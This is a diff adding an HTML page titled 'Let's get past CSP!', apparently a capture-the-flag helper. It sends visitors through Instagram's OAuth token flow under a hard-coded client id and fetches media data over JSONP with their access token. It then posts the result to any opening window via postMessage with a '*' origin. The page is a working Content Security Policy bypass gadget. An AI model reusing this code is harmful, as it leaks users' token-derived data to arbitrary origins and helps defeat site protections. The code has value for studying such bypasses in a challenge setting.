@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<!--suppress ALL -->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Let's get past CSP!</title>
+</head>
+<body>
+<script src="http://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>
+
+    function getQueryHash(name) {
+        name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+        var regex = new RegExp("[\\?&#]" + name + "=([^&#]*)"), results = regex
+                .exec(location.hash);
+        return results === null ? "" : decodeURIComponent(results[1].replace(
+                /\+/g, " "));
+    }
+
+    function getQueryString(name) {
+        name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+        var regex = new RegExp("[\\?&#]" + name + "=([^&#]*)"), results = regex
+                .exec(location.search);
+        return results === null ? "" : decodeURIComponent(results[1].replace(
+                /\+/g, " "));
+    }
+
+    $(function () {
+        if (getQueryHash('access_token') === '') {
+            window.location = 'https://instagram.com/oauth/authorize/?client_id=5717cf4328ba481cbfb378801a50a2ab&redirect_uri=http://teamfreehugs.github.io/csp' + ((getQueryHash('media_id') || getQueryString('media_id')) === "" ? '' : '?media_id=' + getQueryHash('media_id') || getQueryString('media_id')) + '&response_type=token';
+        }
+        var access_token = getQueryHash('access_token');
+        if (getQueryHash('media_id') || getQueryString('media_id') === '') {
+            document.body.innerHTML = '<h1>Sorry, please provide a "media_id" from Instagram!</h1>';
+        }
+        var media_id = getQueryString('media_id') || getQueryHash('media_id');
+        console.log('http://api.instagram.com/oembed?url=http://instagram.com/p/' + media_id);
+        $.ajax({
+            url: 'http://api.instagram.com/oembed?url=http://instagram.com/p/' + media_id,
+            cache: false,
+            type: 'GET',
+            dataType: "jsonp",
+            success: function (data) {
+                console.log(data);
+                var find_real_id = data.media_id;
+                console.log('https://api.instagram.com/v1/media/' + find_real_id + '?access_token=' + access_token)
+                $.ajax({
+                    url: 'https://api.instagram.com/v1/media/' + find_real_id + '?access_token=' + access_token,
+                    cache: false,
+                    dataType: "jsonp",
+                    type: 'GET',
+                    success: function (data) {
+                        document.body.innerHTML = JSON.stringify(data);
+                        if (window.opener !== null)
+                            window.opener.postMessage(JSON.stringify(data), '*');
+                    }
+                });
+            }
+        });
+
+    });
+
+</script>
+</body>
+</html>
